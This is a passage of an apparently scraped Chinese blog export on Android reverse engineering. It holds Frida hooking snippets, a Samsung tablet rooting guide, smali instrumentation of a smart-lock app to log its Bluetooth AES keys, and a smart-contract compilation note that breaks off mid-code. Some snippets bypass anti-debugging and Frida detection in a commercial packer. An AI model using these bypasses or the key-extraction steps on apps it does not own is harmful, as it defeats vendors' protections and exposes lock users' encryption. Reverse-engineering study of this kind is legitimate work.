hook 的函数在函数里面的偏移，thumb 要 + 1var n_addr_so = Module.findBaseAddress(str_name_so);var n_addr_assemble = n_addr_so.add(n_addr_func_offset);Memory.protect(n_addr_assemble, 4, 'rwx'); // 修改内存属性，使程序段可写n_addr_assemble.writeByteArray([0x00, 0x20, 0x00, 0xBF]); 方法二 var str_name_so = \"libhookinunidbg.so\"; // 要 hook 的 so 名var n_addr_func_offset = 0x8CA; // 要 hook 的函数在函数里面的偏移，thumb 要 + 1var n_addr_so = Module.findBaseAddress(str_name_so);var n_addr_assemble = n_addr_so.add(n_addr_func_offset);// safely modify bytes at addressMemory.patchCode(n_addr_assemble, 4, function () &#123; // 以 thumb 的方式获取一个 patch 对象 var cw = new ThumbWriter(n_addr_assemble); // 小端序 // 00 20 cw.putInstruction(0x2000) // 00 BF cw.putInstruction(0xBF00); cw.flush(); // 内存刷新 console.log(hexdump(n_addr_assemble))&#125;); # 内存检索 function searchAndPatch() &#123; var module = Process.findModuleByName(\"libhookinunidbg.so\"); var pattern = \"80 b5 6f 46 84 b0 03 90 02 91\" var matches = Memory.scanSync(module.base, module.size, pattern); console.log(matches.length) if (matches.length !== 0) &#123; var n_addr_assemble = matches[0].address.add(10); // safely modify bytes at address Memory.patchCode(n_addr_assemble, 4, function () &#123; // 以 thumb 的方式获取一个 patch 对象 var cw = new ThumbWriter(n_addr_assemble); // 小端序 // 00 20 cw.putInstruction(0x2000) // 00 BF cw.putInstruction(0xBF00); cw.flush(); // 内存刷新 console.log(hexdump(n_addr_assemble)) &#125;); &#125;&#125;setImmediate(searchAndPatch);# 在 so 加载时就进行 hook 操作 so 加载后的首次函数调用流程为 init-&gt;initarray-&gt;JNI_Onload android_dlopen_ext 可以在 JNI_Onload 时进行 hook function hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; //do your own code &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen, \"libsec2023.so\")通过 hook linker64 的 call_constructors 可以 hook 到加载 so 时的 init 函数 function hook_call_constructors() &#123; var symbols = Process.getModuleByName('linker64').enumerateSymbols(); var call_constructors_addr = null; var get_soname_addr = null; for (var i = 0; i &lt; symbols.length; i++) &#123; if (symbols[i].name.indexOf('call_constructors') !== -1) &#123; console.log(symbols[i].name) call_constructors_addr = symbols[i].address; &#125; else if (symbols[i].name.indexOf('get_soname') !== -1) &#123; console.log(symbols[i].name) get_soname_addr = symbols[i].address; &#125; &#125; Interceptor.attach(call_constructors_addr, &#123; onEnter: function(args) &#123; console.log(\"init call!\") &#125;, onLeave: function (args) &#123; &#125; &#125;);&#125;# 限定于某函数 比如某个函数在 SO 中被大量使用，现在只想分析这个函数在函数 targetfunction 中的使用。 var show = false;Interceptor.attach( Module.findExportByName(\"libc.so\", \"strcmp\"), &#123; onEnter: function(args) &#123; if(show)&#123; console.log(\"strcmp arg1:\"+args[0].readCString()) &#125; &#125;, onLeave: function(ret) &#123; &#125; &#125;);Interceptor.attach( Module.findExportByName(\"libhookinunidbg.so\", \"targetfunction\"),&#123; onEnter: function(args) &#123; show = this; &#125;, onLeave: function(ret) &#123; show = false; &#125; &#125;)# trace so 中 native 函数的调用 stalker_trace_so 使用 stalker_trace_so 打印 so 从加载到内存开始的所调用的函数 trace_natives 使用 trace_natives 对 一个 SO 中的全部函数进行 Trace，并形成如下调用图。 # 打印堆栈 打印尽可能准确的堆栈信息 console.log('RegisterNatives called from:\\\\n' + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('\\\\n') + '\\\\n');打印尽可能多的堆栈信息 console.log('RegisterNatives called from:\\\\n' + Thread.backtrace(this.context, Backtracer.FUZZY).map(DebugSymbol.fromAddress).join('\\\\n') + '\\\\n');如果上面打印堆栈的代码报错退出了，可以手动打印 function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;Thread.backtrace(this.context, Backtracer.FUZZY).map(addr_in_so);# 打印导入表 function hook_import()&#123; var imports=Module.enumerateImports(\"libjiagu_64.so\"); for(var i=0;i&lt;imports.length;i++)&#123; console.log(imports[i].name+\" \"+DebugSymbol.fromAddress(imports[i].address)); &#125;&#125;# 打印寄存器 // 打印所有的寄存器console.log(JSON.stringify(this.context))// 打印某一个的寄存器console.log(this.context.x0)# 读取 jstring var env = Java.vm.getEnv();var str = env.getStringUtfChars(args[5],null).readCString();或者可以用 java 的类 function jstring2Str(jstring) &#123; var ret; Java.perform(function() &#123; var String = Java.use(\"java.lang.String\"); ret = Java.cast(jstring, String); &#125;); return ret;&#125;# 读取 jbytearray function jbyteArray2Array(jbyteArray) &#123; var ret; Java.perform(function() &#123; var b = Java.use('[B'); var buffer = Java.cast(jbyteArray, b); ret = Java.array('byte', buffer); &#125;); return ret;&#125;# 读取 jstringarray var b = Java.use('[Ljava.lang.String;');var strArr = Java.cast(args[6], b);var ArrayClz = Java.use(\"java.lang.reflect.Array\");var len = ArrayClz.getLength(strArr);var arr =[]for(let i=0;i!=len;i++)&#123; arr.push(ArrayClz.get(strArr,i).toString());&#125;# 打开并读取某个文件 function read_file()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x120C30), &#123; onEnter: function (args) &#123; const openPtr = Module.getExportByName('libc.so', 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var readPtr = Module.findExportByName(\"libc.so\", \"read\"); var read = new NativeFunction(readPtr, 'int', ['int', 'pointer', \"int\"]); var fileName = \"/data/data/com.oacia.apk_protect/lib/libjgdtc.so\"; var buffer = Memory.alloc(512); var realFd = open(Memory.allocUtf8String(fileName), 4); read(realFd, buffer, 512); console.log(hexdump(buffer, &#123; offset: 0,// 相对偏移 length: 0x50,//dump 的大小 header: true, ansi: true &#125;)); &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;# 常用反调试函数 dbus function anti_dbus()&#123; Interceptor.attach(Module.findExportByName(null, \"connect\"), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(\"connect\") &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;strstr function anti_strstr()&#123; const strStr = Module.findExportByName(null, \"strstr\"); Interceptor.attach(strStr,&#123; onEnter: function(args)&#123; var haystackstr = args[0].readCString(); var needle_content = args[0].readCString(); if (haystackstr.indexOf('frida')!==-1 || needle_content.indexOf('frida')!==-1 || haystackstr.indexOf('gum-js-loop')!==-1 || needle_content.indexOf('gum-js-loop')!==-1 || haystackstr.indexOf('gmain')!==-1 || needle_content.indexOf('gmain')!==-1 || haystackstr.indexOf('linjector')!==-1 || needle_content.indexOf('linjector')!==-1)&#123; this.strstr_bypass=true &#125; &#125;, onLeave: function(retval)&#123; if(this.strstr_bypass)&#123; console.log(\"strstr bypass\") retval.replace(0x0); &#125; &#125; &#125;);&#125;readlink function anti_readlink()&#123; const readlink_ptr = Module.findExportByName(null, \"readlink\"); console.log('readlink_ptr: ', readlink_ptr); if(!readlink_ptr)&#123; return &#125; const readlink = new NativeFunction(readlink_ptr, 'int', ['pointer', 'pointer', 'pointer']) Interceptor.replace(readlink_ptr, new NativeCallback(function(path, buf, size)&#123; var retval = readlink(path, buf, size); var bufstr = buf.readCString(); console.log(bufstr) if (bufstr.indexOf('frida')!==-1 || bufstr.indexOf('gum-js-loop')!==-1 || bufstr.indexOf('gmain')!==-1 || bufstr.indexOf('linjector')!==-1)&#123; console.log(`\\nreadlink(path=$&#123;path.readCstring()&#125;, buf=$&#123;bufstr&#125;, size=$&#123;size&#125;`); this.buf.writeUtf8String(\"/system/framework/boot.art\") console.log(\"replce with: \"+ this.buf.readCString()) return 0x1A; &#125; return retval; &#125;, 'int', ['pointer', 'pointer', 'pointer']))&#125;TracerPid function check_TracerPid()&#123; var fgetsPtr = Module.findExportByName(\"libc.so\", \"fgets\"); var fgets = new NativeFunction(fgetsPtr, 'pointer', ['pointer', 'int', 'pointer']); Interceptor.replace(fgetsPtr, new NativeCallback(function (buffer, size, fp) &#123; var retval = fgets(buffer, size, fp); var bufstr = Memory.readUtf8String(buffer); //console.log(bufstr) if (bufstr.indexOf(\"TracerPid:\") > -1) &#123; console.log(bufstr); Memory.writeUtf8String(buffer, \"TracerPid:\\t0\"); console.log(\"tracerpid replaced: \" + Memory.readUtf8String(buffer)); &#125; return retval; &#125;, 'pointer', ['pointer', 'int', 'pointer']));&#125;pthread_create function check_pthread_create() &#123; var pthread_create_addr = Module.findExportByName(null, 'pthread_create'); var pthread_create = new NativeFunction(pthread_create_addr, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]); Interceptor.replace(pthread_create_addr, new NativeCallback(function (parg0, parg1, parg2, parg3) &#123; var so_name = Process.findModuleByAddress(parg2).name; var so_path = Process.findModuleByAddress(parg2).path; var so_base = Module.getBaseAddress(so_name); var offset = parg2 - so_base; var PC = 0; if ((so_name.indexOf(\"jiagu\") > -1)) &#123; console.log(\"======\") console.log(\"find thread func offset\", so_name, offset.toString(16)); Thread.backtrace(this.context, Backtracer.ACCURATE).map(addr_in_so); var check_list = []//1769036,1771844 if (check_list.indexOf(offset)!==-1) &#123; console.log(\"check bypass\") &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; return PC; &#125;, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]))&#125;# python bridge # 让 frida spawn 到 app 的子进程上 假如 app 的一个关键逻辑是运行在子进程上面的，那么就很有可能出现我们 hook 了这个进程，但什么都没 hook 到的情况，对于这种情况，我们可以使用 frida 的 child_gating 机制，让 frida 也能够附加到子进程上面 import codecsimport fridaimport sysimport threadingdevice = frida.get_device_manager().add_remote_device(\"127.0.0.1:1234\")pending = []sessions = []scripts = []event = threading.Event()jscode = open('./hook.js', 'r', encoding='utf-8').read()pkg = \"tv.danmaku.bili\" #包名def spawn_added(spawn): event.set() if spawn.identifier == pkg or spawn.identifier == f\"&#123;pkg&#125;:web\": print('spawn_added:', spawn) session = device.attach(spawn.pid) script = session.create_script(jscode) script.on('message', on_message) script.load() device.resume(spawn.pid)def spawn_removed(spawn): print('spawn_removed:', spawn) event.set()def on_message(spawn, message, data): print('on_message:', spawn, message, data)def on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)device.on('spawn-added', spawn_added)device.on('spawn-removed', spawn_removed)device.enable_spawn_gating()event = threading.Event()print('Enabled spawn gating')pid = device.spawn([pkg])session = device.attach(pid)print(\"[*] Attach Application id:\", pid)device.resume(pid)sys.stdin.read()","categories":[],"tags":[{"name":"frida","slug":"frida","permalink":"https://oacia.dev/tags/frida/"},{"name":"安卓逆向","slug":"安卓逆向","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"}]},{"title":"对SM-P200平板的root记录","slug":"对SM-P200平板的root记录","date":"2023-04-02T09:33:17.000Z","updated":"2025-04-08T18:55:12.177Z","comments":true,"path":"对SM-P200平板的root记录/","link":"","permalink":"https://oacia.dev/%E5%AF%B9SM-P200%E5%B9%B3%E6%9D%BF%E7%9A%84root%E8%AE%B0%E5%BD%95/","excerpt":"","text":"这段时间学习安卓逆向的过程中，急需一台 root 机，一开始想把自己的手机 root 了，但是考虑到 root 的过程中会清除所有数据，所以就想着换一台备用机去 root, 正好过去高中的时候被学校强制要求买了一台三星的 SM-P200 平板，高中过后这平板也闲置了下来，正好今天有需要，就把他拿出来，花了两天时间终于将平板 root 好了，所以记录一下平板 root 的过程 对于三星系列手机平板的 root 我的建议是参考此处 # 0x01 下载三星官方原版刷机包 这是最重要的一步，你需要去网上下载官方原版的刷机包，格式类似于这种 AP , BL , CSC 如果有兴趣了解这些不同名称的刷机包的作用，可以看看这篇文章 如果是 SM-P200 型号的三星平板的话，可以直接下载我先前已经购买的官方原版刷机包 (花了五块大洋嘞) 下载地址：https://pan.baidu.com/s/1zL0K1tskeKtppqEQ6-RYvg 提取码：467m 下载的是一个 .zip 压缩包，解压之后就有上图所示的文件了 如果型号不一样的话，那只能去网上找找啦 # 0x02 解锁 BL 锁 (Bootloader) Q: 为什么需要解锁 BL 锁？ A: BL 锁的作用是阻止你使用非官网的刷机包进行刷机，不解锁 BL 锁，那么 root 将会失败的 注意：解锁 BL 锁的过程将会清除平板的所有数据，请及时做好数据的备份！ 首先需要打开平板的开发者选项，然后开启 OEM解锁 选项 重启手机，对于三星手机来说，你需要在重启的过程中同时按住 音量+ 和 音量- 这两个键，然后就会出现一个提示界面，一直 YES 点下去就可以啦 手机重启之后再次进入 设置-开发者选项 ，如果 OEM解锁 这个选项变成灰色的，那么就说明 BL 锁已经解锁成功了 如果还是对解锁过程不大清楚的话，可以去 b 站上看看这个视频 # 0x03 使用 Magisk 将刷机包中的 AP 文件刷入 root 权限 Magisk 下载地址: https://github.com/topjohnwu/Magisk/releases 下载完 apk 文件后，将平板用数据线和电脑连接起来，然后用 adb install Magisk.apk 命令进行安装，之后将刷机包中 AP 开头的文件复制到平板的根目录中 如果不清楚如何复制文件到根目录，具体方法是用数据线连接电脑后，你将在 此电脑 处看到 双击点进去，进入这个目录中 然后把先前下载的 AP文件 复制粘贴过去就行了 之后打开 Magisk , 依次点击 安装-&gt;安装到Recovery-&gt;下一步-&gt;选择并修补一个文件 ，然后选择先前复制过去的 AP 开头的文件，点击开始后坐等 Magisk 提示 ALL done 就可以了 随后再次在电脑上进入 此电脑\\Galaxy Tab A with S Pen\\Tablet\\Download 目录，你应该可以在这里找到 Magisk 最新修补好的文件，将其复制到电脑上 # 0x04 使用 Odin3 对三星平板进行刷机 Odin3-v3.14.4 下载连接： https://www.ydfile.com/file/odin/Odin3_v3.14.4.html 当用 USB 成功连接电脑后，这个地方应该显示为这种浅绿色，表示可以刷机 之后在 windows 中打开命令提示符，输入如下命令 adb reboot bootloader 进入 Download 界面 如果这种方法不行的话，你也可以手动进入，具体方法是先将平板关机，然后长按 开机 和 音量+ 这两个键，之后会选择 reboot to bootloader 就可以了 之后将 BL,AP,CSC 文件都填进去如下图所示，点击 Start, 然后坐等刷机完成就可以了 注意：这里的 AP 文件是由 Magisk 修补好的文件！ 重新开机后，我们用 adb shell su 测试一下 ok 成功 root","categories":[],"tags":[{"name":"root","slug":"root","permalink":"https://oacia.dev/tags/root/"},{"name":"平板刷机","slug":"平板刷机","permalink":"https://oacia.dev/tags/%E5%B9%B3%E6%9D%BF%E5%88%B7%E6%9C%BA/"},{"name":"BL锁","slug":"BL锁","permalink":"https://oacia.dev/tags/BL%E9%94%81/"},{"name":"magisk","slug":"magisk","permalink":"https://oacia.dev/tags/magisk/"},{"name":"odin3","slug":"odin3","permalink":"https://oacia.dev/tags/odin3/"}]},{"title":"对某apk的一次插桩记录","slug":"对某apk的一次插桩记录","date":"2023-03-27T10:32:22.000Z","updated":"2025-04-08T18:55:12.179Z","comments":true,"path":"对某apk的一次插桩记录/","link":"","permalink":"https://oacia.dev/%E5%AF%B9%E6%9F%90apk%E7%9A%84%E4%B8%80%E6%AC%A1%E6%8F%92%E6%A1%A9%E8%AE%B0%E5%BD%95/","excerpt":"","text":"今天受好友 nameless 的委托，对一个名叫 nokelock 的 apk 进行插桩，希望在日志中打印出蓝牙加密包的密文，密钥与明文，由于本人是第一次对 apk 进行插桩，于是写了这一篇文章用以学习和记录. # 0x01 什么是插桩？ 依据本人的拙见，插桩就是在原有的代码中插入自己写的代码，用以打印某些想要知道的变量的值。当然了，插入的代码也可以在原有代码的基础上，为 app 增加各种各样的额外功能。 在过去学习 fuzz 的过程中，也有过插桩这一个概念，而过去使用的 afl-fuzz 是在二进制汇编代码中插桩，这一次是需要在 apk 中进行插桩，今日总体的插桩流程体验下来，本人明显感觉到在 apk 中插桩的灵活性明显跟好，而且可操作性更强. # 0x02 对于 apk 的初步处理 # 需要插桩的代码位置 &amp;&amp; 需要打印的变量名称 现在我们给到的是一个 base.apk 如果我们想要对代码进行插桩，那么我们首先需要知道我们要在代码的什么地方去插桩 很幸运当我给到这一个 apk 的时候，nameless 已经找到了需要插桩的代码位于 com.nokelock.blelibrary.b.b 中 我们用 jadx 反编译看一下相关的 java 代码 一看代码，这就是很典型的 AES 加密，而我们需要在日志中打印的变量也一目了然，分别是 bArr , bArr2 和 instance.doFinal(bArr) # 得到 apk 的 smali 代码 假如我们想要对 apk 进行插桩，我们无法直接修改反编译出的 java 代码，而是需要修改比 java 代码更加底层的 smali 代码 简单来说，java 和 smali 代码的关系可以简单类比为 c 语言和汇编语言之间的关系 那么如何查看 smali 代码呢？ # 简单查看 smali 代码 如果在 jadx 中，我们可以直接对相关的 java 代码按一下 tab 键，然后就能得到更加原始的 smali 代码 但是需要注意的是，虽然这种方式可以查看其 smali 代码，但是无法重新编译并打包 apk, 就是说你可以看，但是你改不了:] # 修改 smali 代码并重新打包签名生成 apk 这里我强烈推荐使用 apk easy tool 这个工具，问就是相当的好用；) 下载完成之后打开 apk easy tool , 然后把我们需要反编译的 apk 拖到这个工具里面，直接先点一下反编译，然后在点一下打开反编译目录，就可以看到 apk 的 smali 代码了 之后根据我们需要插桩的代码的路径 ( com.nokelock.blelibrary.b.b ) 一级一级的点进去，就得到了可以直接编辑的 smali 代码 # 0x03 如何插桩？ 当我们打开 b.smali 文件后，通过对相同方法名和形参类型的寻找，我们可以快速定位到如下代码段 .method public static a([B[B)[B .locals 2 :try_start_0 new-instance v0, Ljavax/crypto/spec/SecretKeySpec; const-string v1, \"AES\" invoke-direct &#123;v0, p1, v1&#125;, Ljavax/crypto/spec/SecretKeySpec;->&lt;init>([BLjava/lang/String;)V const-string p1, \"AES/ECB/NoPadding\" invoke-static &#123;p1&#125;, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher; move-result-object p1 const/4 v1, 0x1 invoke-virtual &#123;p1, v1, v0&#125;, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V invoke-virtual &#123;p1, p0&#125;, Ljavax/crypto/Cipher;->doFinal([B)[B move-result-object p0 :try_end_0 .catch Ljava/lang/Exception; &#123;:try_start_0 .. :try_end_0&#125; :catch_0 return-object p0 :catch_0 const/4 p0, 0x0 return-object p0.end method.method public static b([B[B)[B .locals 2 :try_start_0 new-instance v0, Ljavax/crypto/spec/SecretKeySpec; const-string v1, \"AES\" invoke-direct &#123;v0, p1, v1&#125;, Ljavax/crypto/spec/SecretKeySpec;->&lt;init>([BLjava/lang/String;)V const-string p1, \"AES/ECB/NoPadding\" invoke-static &#123;p1&#125;, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher; move-result-object p1 const/4 v1, 0x2 invoke-virtual &#123;p1, v1, v0&#125;, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V invoke-virtual &#123;p1, p0&#125;, Ljavax/crypto/Cipher;->doFinal([B)[B move-result-object p0 :try_end_0 .catch Ljava/lang/Exception; &#123;:try_start_0 .. :try_end_0&#125; :catch_0 return-object p0 :catch_0 const/4 p0, 0x0 return-object p0.end method初见这种 smali 代码可能会有手足无措的感觉，但是我自己感觉 smali 代码其实要比汇编更加的简单易懂 回到正题，对于首次插桩，我们可以在 github 上下载现成的插桩代码 Smali 插桩自用代码库 用法很简单，首先将代码下载下来之后，将 SewellDinGLog.smali 直接复制到 apk easy tool 反编译完成后的那个 smail 文件夹中如图所示 # 在哪里插桩？ ok 我们重新回到 b.smali 中 我们可以插桩的代码位置有两处 (为什么是这两处！？没有别的地方吗 ---- 亲身经历，要是插桩在别的地方会无法回编译报错：0) 在 invoke-static/invoke-virtual/invoke-direct 指令返回类型是 V 之后可以加入 在 invoke-static/invoke-virtual/invoke-direct 指令返回类型不是 V，那么在 move-result-object 命令之后可以加入 # 插桩代码 invoke-static &#123;&#125;, LSewellDinGLog;->Log()V# 无参数，用来判断函数是否执行invoke-static &#123;v1&#125;, LSewellDinGLog;->Log(Ljava/lang/Object;)V# 打印字符串invoke-static &#123;v1&#125;, LSewellDinGLog;->Log([Ljava/lang/Object;)V# 打印数组这里的插桩代码我们可以结合 SewellDinGLog.java 来看 import java.util.Arrays;import android.util.Log;public class SewellDinGLog &#123; public static void Log(String tag, String msg) &#123;// 两个参数 Log.d(tag, msg); &#125; public static void Log() &#123;// 无参数 Log(\"SewellDinG\", \"DeBug ...\"); &#125; public static void Log(Object someObj) &#123;// 一个参数，打印字符串 Log(\"SewellDinG\", someObj.toString()); &#125; public static void Log(Object[] someObj) &#123;// 一个参数，打印数组 Log(\"SewellDinG\", Arrays.toString(someObj)); &#125;&#125;代码很简单，就是直接使用 Log 来打印变量 随后我们便可以根据插桩的规则，插入相应的代码，位置类似下图 随后我们再次打开 apk easy tool , 点一下回编译，在点一下打开回编译目录，就能找到最新编译成功的 apk # 查看日志 之后使用 adb 命令运行该 apk, 然后使用命令就可以查看打印的日志 adb logcat -s SewellDinG # 0x04 意料之外的错误 但是当我将插桩后的代码发给 nameless 后，确实有日志打印出来，但是却是长这个样子的 F:\\platform-tools&gt;adb logcat -s SewellDinG --------- beginning of main 03-27 12:38:56.882 14325 14325 D SewellDinG: [B@3ad0a72 03-27 12:38:56.882 14325 14325 D SewellDinG: [B@85ec3 03-27 12:38:56.882 14325 14325 D SewellDinG: [B@e41f340 03-27 12:39:05.392 14325 14325 D SewellDinG: [B@4ee0ab4 03-27 12:39:05.392 14325 14325 D SewellDinG: [B@bd596dd 03-27 12:39:05.392 14325 14325 D SewellDinG: [B@9d6c252 我正疑惑呢难道密钥密文明文都是 [B@ 开头的？后来才发现是 SewellDinGLog.smali 代码有问题 首先我需要打印的是一个 byte 类型是数组，而打印数组的 java 代码是长这个样子的 public static void Log(Object[] someObj) &#123;// 一个参数，打印数组 Log(\"SewellDinG\", Arrays.toString(someObj)); &#125;这里就有问题了呀，直接使用 toString 方法，对于字节数组来说返回是字节数组的地址而非字节数组的值！ # 0x05 处理 bug, 重新编写代码 SewellDinGLog.smali 在这个过程中，我清楚的认识到我应该修改的是 smali 代码，但是如何修改？ 我认为最为简便的方法就是先编写 java 代码，然后再编译成 smali 代码，可是要怎么实现呢？ 我 java 的运行平台都是 IDEA, 但是我发现 SewellDinGLog.java 所需要的包 android.util.Log 根本就没有，在网上找了找也找不到这个包，之后通过 google 了很久，才知道我需要安装一个 Android Studio 安装好了之后，就新建一个项目，然后把要运行的代码复制粘贴进去 要注意这里 Language 一定要选 Java, 不要选 Kotlin , 不然得像我一样下了很久的安装包最后发现代码根本运行不了 第一次使用 Android studio , 得需要等大约几十分钟安装运行所需要的包 随后点击 File--&gt;Settings--&gt;Plugins , 然后在插件市场搜索 java2smali , 安装完之后重启 Android studio , 然后在 Build--&gt;Compile to smali 就可以直接生成 smali 代码了 为了能够成功 Log 打印字节数组，我们需要对原先的 SewellDinGLog.java 代码进行相应的修改，然后使用 Build--&gt;Compile to smali 生成 smail 代码 修改后的 java 代码如下 package com.example.newlog;import android.util.Log;public class SewellDinGLog &#123; final protected static char[] hexArray = \"0123456789ABCDEF\".toCharArray(); public static String bytesToHex(byte[] bytes) &#123; char[] hexChars = new char[bytes.length * 2]; for ( int j = 0; j &lt; bytes.length; j++ ) &#123; int v = bytes[j] &amp; 0xFF; hexChars[j * 2] = hexArray[v >>> 4]; hexChars[j * 2 + 1] = hexArray[v &amp; 0x0F]; &#125; return new String(hexChars); &#125; public static void Log(String tag, String msg) &#123; Log.d(tag, msg); &#125; public static void Log() &#123; Log(\"SewellDinG\", \"DeBug ...\"); &#125; public static void Log(byte[] someObj) &#123; String result = bytesToHex(someObj); Log(\"SewellDinG\", result); &#125;&#125;随后在同级文件夹下就会生成 SewellDinGLog.smali 这里要注意的是由于我们的 SewellDinGLog.smali 是放在 apk easy tool 反编译后的 smali 文件夹的根文件夹下，所以我们需要对 SewellDinGLog.smali 内的代码进行修改 例如我这里 那么需要将所有的 Lcom/example/newlog/SewellDinGLog 全部替换成 LSewellDinGLog 变成这样 随后和之前的步骤一模一样，把 SewellDinGLog.smali 复制到 smali 文件夹内，然后插桩，回编译就可以了 插桩后的 apk 我们再用 jadx 反编译看看 发现相较之前多了 SewellDinGLog.Log 函数用以打印变量的值 最后我们也是成功打印出变量的值 F:\\platform-tools&gt;adb logcat -s SewellDinG --------- beginning of main 03-27 17:18:08.895 31117 31117 D SewellDinG: 05010630303030303082E3C89616017D 03-27 17:18:08.895 31117 31117 D SewellDinG: 241F632E5907042061014C1A3A45193B 03-27 17:18:08.895 31117 31117 D SewellDinG: 6629B62C88A7E50525E92C328AF258E6 03-27 17:18:10.114 31117 31117 D SewellDinG: 732F5CB22C06B0C2D0D17AD31D165805 03-27 17:18:10.114 31117 31117 D SewellDinG: 241F632E5907042061014C1A3A45193B 03-27 17:18:10.114 31117 31117 D SewellDinG: 05020100E3C896010202000000000000 03-27 17:18:11.770 31117 31117 D SewellDinG: 530B1FCA1467A408A321E71F3D152127 03-27 17:18:11.771 31117 31117 D SewellDinG: 241F632E5907042061014C1A3A45193B # 0x06 一个自问自答 Q: 为什么不直接使用 android.util.Log 中的 Log 函数来打印，即在需要插桩的位置插入这串代码 invoke-static &#123;p0, p1&#125;, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I, 而是调用另一个类中的函数来打印呢？ A: 我认为重写一个 Log 打印方法，灵活性将会更高，我们可以将复杂的代码先用 java 编写，然后再编译成 smali, 这样比直接用 smali 写代码要更简单方便，只需要插桩的位置添加一个函数方法的调用就可以了.","categories":[],"tags":[{"name":"安卓静态插桩","slug":"安卓静态插桩","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%9D%99%E6%80%81%E6%8F%92%E6%A1%A9/"},{"name":"smali","slug":"smali","permalink":"https://oacia.dev/tags/smali/"}]},{"title":"批量编译智能合约过程记录","slug":"批量编译智能合约过程记录","date":"2023-03-20T12:29:52.000Z","updated":"2025-04-08T18:55:12.188Z","comments":true,"path":"批量编译智能合约过程记录/","link":"","permalink":"https://oacia.dev/%E6%89%B9%E9%87%8F%E7%BC%96%E8%AF%91%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/","excerpt":"","text":"这两天的区块链研究我的任务是要把大约五万个智能合约的源码编译成字节码的形式，并且提取智能合约中所用到的公开库，过程中遇到了一些困难，当然也是有收获的，所以在这个任务做完之后，写了这篇文章记录一下 # 0x01 初步分析 我们需要批量编译的智能合约所在的文件夹结构如下 ├─0x01ea1afecdab69ab00212e6f9ed0209c0bf75ac9 │ code.abi │ code.sol │ contract_creation_code │ info │ ├─0x01eacc3ae59ee7fbbc191d63e8e1ccfdac11628c │ code.abi │ code.sol │ contract_creation_code │ info # 子文件分析 0x01ea1afecdab69ab00212e6f9ed0209c0bf75ac9 合约地址 code.abi 智能合约的 ABI 文件 code.sol 智能合约的源码 contract_creation_code 这是一个空文件，暂未发现该文件的其他内容 info 储存了合约编译过程中所需要的变量名 info 文件的内容如下 GasToken2//GasToken2为智能合约的合约名称,由于在code.sol文件中不止有一个contract,所以这个名称是十分重要的 v0.4.16+commit.d7661dd9//编译器的版本 0 200 # 0x02 提取公开库与编译智能合约的实现方式思考 # 如何提取智能合约中所用到的公开库？ 通过对 code.sol 进行分析，我们发现只有极少的公开库使用了 import 这一公开库的调用方式，例如以下形式: import &quot;./SafeMath.sol&quot;; 而绝大多数的智能合约源代码调用公开库的方式都是通过将公开库的代码直接复制到智能合约源代码内，然后在同一个 .sol 中进行调用，示例如下 pragma solidity ^0.4.25;/*** @title SafeMath* @dev Math operations with safety checks that throw on error*/library SafeMath &#123; //... 公开库代码&#125;contract AuctionPotato &#123; using SafeMath for uint256; // 调用公开库 //... 智能合约的源代码 &#125;而公开库前的类型定义符共有三种，分别是 library , contract 和 interface 所以我们便可以顺理成章的使用正则表达式提取所有上述关键词后库的名称 然而我们提取到这些库的名称之后，要怎么知道这些库是公开库呢？要知道定义主合约例如上述示例中的 AuctionPotato 前面的关键字也是 contract 呀 这时我想到 openzeppelin-contracts 不是保存了绝大多数智能合约的公开库吗？那我判断提取到的合约名称是否在公开库名称的列表中，不就可以知道这个是不是公开库了嘛 实现如下 import osimport re def ReadLibraryName(): LibraryPath = r\"E:\\solidity\\智能合约Library的识别和相似度分析\\openzeppelin-contracts-master\\contracts\" L = [] for dirpath, dirnames, filenames in os.walk(LibraryPath): for file in filenames: if os.path.splitext(file)[1] == '.sol': L.append(os.path.join(os.path.splitext(file)[0])) return LLibratyName = ReadLibraryName()# 读取公开库名称try: with open(f\"&#123;DataDir&#125;\\\\&#123;ContractAddress&#125;\\\\code.sol\", 'r') as f: src = f.readlines()except Exception as e: # print(f\"error during read file!&#123;str(e)&#125;, at &#123;ContractAddress&#125;\") continueif len(src[0]) > 100: continue# print(ContractAddress)# print(src[0])openSource = []for line in src: matchLib = re.search(r\"^library\\s+(\\w+)\\s*\", line)# 定义为 library 类型的库 if matchLib: T = matchLib.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchContract 